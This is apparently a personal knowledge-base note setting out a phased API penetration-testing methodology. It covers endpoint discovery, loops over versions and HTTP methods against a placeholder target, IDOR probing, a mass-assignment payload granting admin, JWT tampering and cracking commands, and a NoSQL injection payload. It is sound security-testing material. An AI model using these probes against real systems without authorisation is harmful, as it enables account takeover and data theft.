---
status: seedling
tags: [api, web-security, pen-testing, security]
created: 2026-04-10
updated: 2026-04-10
---

# API Endpoint Testing

## Summary
The systematic process of discovering, mapping, and testing API endpoints for security vulnerabilities using a phased methodology.

## Details
API Testing requires a structured approach to uncover hidden interfaces and exploit authorization or logic flaws.

### Phase 1: API Discovery
- **Crawl JS files**: Use `katana -u <url> -jc` or `linkfinder` to extract endpoints from frontend code.
- **Brute Force**: Fuzz common paths (`/swagger.json`, `/api-docs`, `/v1/users`) using `ffuf` or `gobuster`.
- **Historical Analysis**: Use `waybackurls` or `gau` to identify deprecated/vulnerable API versions.

### Phase 2: API Versioning Attacks
Test every version string (`v0`, `v1`, `v2`, `beta`, `dev`, `test`, `internal`, `old`) to find forgotten security controls.

```bash
for v in v0 v1 v2 v3 v4 beta dev test internal old; do
  curl -s -o /dev/null -w "%{http_code} /api/$v/users\n" \
  https://target.com/api/$v/users
done
```
*Note: Older versions often lack current auth requirements or rate limiting.*

### Phase 3: HTTP Method Testing
Verify if restricted actions are accessible via alternative methods or overrides.
```bash
# Test all methods
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  echo -n "$method /api/users: "
  curl -s -o /dev/null -w "%{http_code}\n" \
       -X $method https://target.com/api/users \
       -H "Authorization: Bearer <token>"
done
```
- **TRACE Method**: `curl -X TRACE <url> -H "Cookie: session=..."` to see if the server reflects session cookies.
- **Method Override**: If `DELETE` is blocked, try `POST /api/user/123` with `X-HTTP-Method-Override: DELETE`.

### Phase 4: Authentication & Authorization (BOLA/IDOR)
- **BOLA/IDOR**: Access resources of other users by incrementing IDs.

  ```bash
  GET /api/users/100/orders -> 200 OK
  GET /api/users/101/orders -> If 200 OK = BOLA Vulnerability
  ```
- **Mass Assignment**: Over-assign fields during registration or profile updates.

  ```json
  POST /api/register
  { "username": "hacker", "password": "123", "role": "admin", "isAdmin": true }
  ```
- **JWT Attacks**: Tamper with payloads, test `alg: none`, or brute-force weak secrets.

  ```bash
  python3 jwt_tool.py <token> -T   # tamper
  python3 jwt_tool.py <token> -X a # alg confusion
  hashcat -a 0 -m 16500 <jwt> wordlist.txt # crack
  ```

### Phase 5: Input Validation & Logic
- **NoSQL Injection**: `{ "username": {"$gt": ""}, "password": {"$gt": ""} }`.
- **Parameter Pollution**: `GET /api/transfer?amount=100&to=victim&to=attacker`.
- **GraphQL**: Check for introspection `{"query": "{ __schema { types { name } } }"}` and batching attacks.

### Top API Bugs by Impact
| Bug              | Impact   | Frequency |
| ---------------- | -------- | --------- |
| BOLA/IDOR        | Critical | Very High |
| Broken Auth      | Critical | High      |
| Mass Assignment  | High     | High      |
| No Rate Limiting | High     | Very High |
| SSRF via Webhook | Critical | Medium    |

## Associative Trails
APIs are often built with the assumption that the client is trusted, leading to "over-returning" data and weak server-side validation. This note serves as the primary technical playbook for breaking those assumptions.

## Connections
- [[Web Application Security (MOC)]]
- [[What Leads to API Vulnerabilities]]
- [[Parameters in API Enumeration]]
- [[How to Know if an API Has Authentication]]

## Sources
- redteam-complete-guide.md
- API Endpoint Testing.md
